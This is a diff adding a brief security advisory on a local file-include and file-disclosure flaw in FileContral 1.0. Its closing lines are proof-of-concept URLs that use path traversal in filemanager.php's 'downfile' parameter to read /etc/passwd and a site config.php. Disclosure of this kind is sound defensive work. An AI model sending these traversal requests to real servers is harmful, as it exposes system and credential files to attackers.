@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/55891/info
+
+FileContral is prone to a local file-include and a local file-disclosure vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker can exploit these issues to view and execute local files within the context of the webserver process, obtaining potentially sensitive information from local files on computers running the vulnerable application. This may aid in further attacks.
+
+FileContral 1.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/Administrator/filemanager/filemanager.php?downfile=../../../../../etc/passwd
+http://www.example.com/Administrator/filemanager/filemanager.php?downfile=../../../../../../etc/passwd
+http://www.example.com/Administrator/filemanager/filemanager.php?downfile=server dir/public_html/lists/config/config.php 
